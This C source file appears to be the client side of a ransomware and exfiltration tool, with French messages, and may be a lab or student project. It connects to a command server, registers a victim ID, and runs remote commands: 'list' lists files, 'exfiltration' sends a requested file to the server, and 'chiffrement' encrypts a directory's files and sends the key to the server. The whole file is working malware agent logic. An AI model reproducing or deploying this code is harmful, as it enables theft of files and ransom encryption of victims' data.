#include "common.h"
#include "fonction.h"

#define SERVER_IP "127.0.0.1"
#define SERVER_PORT 8081
#define BUFFER_SIZE 4096
#define ID_LENGTH 8

void printClientBanner() {
    printf("        ___            __\n");
    printf("  _____/ (_)__  ____  / /_\n");
    printf(" / ___/ / / _ \\/ __ \\/ __/\n");
    printf("/ /__/ / /  __/ / / / /_  \n");
    printf("\\___/_/_/\\___/_/ /_/\\__/  \n");
    printf("\n");
}

void handleCommand(my_socket_t clientSocket, const char *command) {
    if (strcmp(command, "list") == 0) {
        printf("Commande 'list' reçue. Exécution...\n");
        listFiles(clientSocket);
        const char *endMessage = "END_OF_LIST";
        if (send(clientSocket, endMessage, strlen(endMessage), 0) < 0) {
            perror("Erreur lors de l'envoi du signal de fin de liste");
        }
    } else if (strcmp(command, "exfiltration") == 0) {
        printf("Commande 'exfiltration' reçue. Exécution...\n");
        char fileName[BUFFER_SIZE];
        memset(fileName, 0, BUFFER_SIZE);

        if (recv(clientSocket, fileName, BUFFER_SIZE - 1, 0) <= 0) {
            perror("Erreur lors de la réception du nom de fichier");
            return;
        }

        printf("Nom du fichier demandé : %s\n", fileName);

        if (exfiltration(clientSocket, fileName) != 0) {
            printf("Erreur lors de l'exfiltration du fichier.\n");
        }
        const char *endMessage = "END_OF_FILE";
        if (send(clientSocket, endMessage, strlen(endMessage), 0) < 0) {
            perror("Erreur lors de l'envoi du signal de fin d'exfiltration");
        }
    } else if (strcmp(command, "chiffrement") == 0) {
        printf("Commande 'chiffrement' reçue. Exécution...\n");
        char encryptionKey[17];
        generateEncryptionKey(encryptionKey, sizeof(encryptionKey));

        // Stocker la clé localement dans key.txt
        FILE *keyFile = fopen("key.txt", "w");
        if (keyFile) {
            fprintf(keyFile, "%s", encryptionKey);
            fclose(keyFile);
            printf("Clé de chiffrement stockée localement dans 'key.txt'.\n");
        } else {
            perror("Erreur lors de la sauvegarde de la clé localement");
        }

        // Chiffrer un fichier spécifique dans le répertoire 'files_to_encrypt'
        encryptFiles("files_to_encrypt", encryptionKey);

        // Envoyer la clé au serveur
        if (send(clientSocket, encryptionKey, (int)strlen(encryptionKey), 0) < 0) {
            perror("Erreur lors de l'envoi de la clé de chiffrement");
        } else {
            printf("Clé de chiffrement envoyée au serveur.\n");
        }
    } else {
        printf("Commande inconnue ou non prise en charge : %s\n", command);
    }
}

int main() {
    printClientBanner();
    char identifiant[ID_LENGTH + 1];
    generer_client_id(identifiant, ID_LENGTH);
    printf("Identifiant généré : %s\n", identifiant);

#ifdef _WIN32
    WSADATA wsa;
    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
        printf("Erreur lors de l'initialisation de Winsock.\n");
        return 1;
    }
#endif

    my_socket_t clientSocket;
    struct sockaddr_in serverAddr;

    clientSocket = socket(AF_INET, SOCK_STREAM, 0);
    if (clientSocket == INVALID_SOCKET_VALUE) {
        perror("Erreur lors de la création du socket");
        return 1;
    }

    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(SERVER_PORT);
    serverAddr.sin_addr.s_addr = inet_addr(SERVER_IP);

    if (connect(clientSocket, (struct sockaddr *)&serverAddr, sizeof(serverAddr)) < 0) {
        perror("Erreur lors de la connexion au serveur");
        CLOSE_SOCKET(clientSocket);
        return 1;
    }

    printf("Connecté au serveur avec succès.\n");

    if (send(clientSocket, identifiant, strlen(identifiant), 0) < 0) {
        perror("Erreur lors de l'envoi de l'identifiant");
        CLOSE_SOCKET(clientSocket);
        return 1;
    }

    printf("Identifiant envoyé : %s\n", identifiant);

    char buffer[BUFFER_SIZE];
    while (1) {
        memset(buffer, 0, BUFFER_SIZE);
        int bytesReceived = recv(clientSocket, buffer, BUFFER_SIZE - 1, 0);
        if (bytesReceived <= 0) {
            printf("Connexion fermée par le serveur.\n");
            break;
        }

        buffer[bytesReceived] = '\0';
        printf("Commande reçue : %s\n", buffer);

        if (strcmp(buffer, "exit") == 0) {
            printf("Commande 'exit' reçue. Fermeture...\n");
            break;
        }

        handleCommand(clientSocket, buffer);
    }

    CLOSE_SOCKET(clientSocket);

#ifdef _WIN32
    WSACleanup();
#endif

    return 0;
}
